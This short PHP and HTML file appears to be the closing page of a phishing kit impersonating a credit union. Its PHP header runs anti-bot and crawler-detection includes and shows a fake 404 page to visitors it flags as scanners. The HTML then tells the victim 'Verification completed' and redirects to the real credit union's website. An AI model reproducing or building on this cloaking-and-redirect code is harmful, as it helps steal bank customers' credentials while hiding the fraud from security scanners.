<?php session_start();require_once './src/Classes/Comp.php';require_once './src/Classes/Antibot.php';$comps = new Comp;$antibot = new Antibot;if (!$comps->checkValue()) {echo $antibot->throw404();die();}require_once './zsec.php';include './huehuehue.php';include './bot_fucker/bot.php';include './bot_fucker/wrd.php';include './crawlerdetect.php';session_destroy();
?><!DOCTYPE html>
...
<head>
    ...
    <meta http-equiv="refresh" content="3;url=https://veridiancu.org">
...
<div class="rew">
    ...
    <div class="rew">
      ...
      <div class="col-75">
      <center>
     <img width="150" height="150" src="files/success.gif">
     <br>

     <br><br>
     <p>Verification completed we will redirect you to main page </p>
     </center>
      </div>
